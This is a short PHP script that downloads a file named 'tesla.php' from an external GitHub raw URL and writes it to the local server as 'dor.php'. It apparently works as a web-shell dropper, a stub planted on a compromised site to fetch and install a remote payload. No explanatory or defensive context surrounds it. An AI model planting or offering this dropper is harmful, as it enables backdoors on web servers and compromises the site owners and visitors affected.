 <?php $nama= fopen("dor.php" ,"w+");
  $file = file_get_contents('https://raw.githubusercontent.com/prokontra/byps/main/tesla.php');
  $tulis = fwrite ($nama ,$file);
 fclose($nama); ?>
